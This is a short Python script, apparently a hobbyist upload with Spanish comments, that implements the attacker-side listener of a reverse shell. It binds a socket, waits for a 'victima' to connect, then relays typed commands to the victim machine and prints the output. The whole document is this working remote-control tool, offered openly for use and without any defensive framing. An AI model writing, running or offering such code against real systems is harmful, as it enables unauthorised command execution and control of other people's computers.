#Reverse shell en python
#Esta mierda es super basica pero pero pero algo tenia que subir

#----------------------------------------------------------------------
#No importa el tamañp del pajaro, si no como destroces a la cerda

#---Angry Birds

import socket , subprocess , sys , time 

server=socket.socket(socket.AF_INET , socket.SOCK_STREAM)
server.bind(("localhost" , 9090)) # Especifica la ip y el puerto que quieras
server.listen(1)
print("[+] Esperando conexion......")
victima,addr=server.accept() # aca el server acepta la conexion de la victima
print(" ")
print(f'[+]Conexion de {addr}')

while True:
	try:
		dir_e = victima.recv(1024).decode("utf-8")
		mensaje = str(input(f"{dir_e}>"))
		if mensaje == "cls":
			time.sleep(1)
			subprocess.run("cls" , shell=True)
			time.sleep(1)
			mensaje = str(input(f"{dir_e}>"))
			victima.sendall(mensaje.encode("utf-8"))
			l = victima.recv(4096).decode("utf-8")
			print(l)
		else:
			victima.sendall(mensaje.encode("utf-8"))
			l = victima.recv(4096).decode("utf-8")
			print(l)
	except Exception as e:
		print("Un error a ocurrido " ,e )
		sys.exit(1)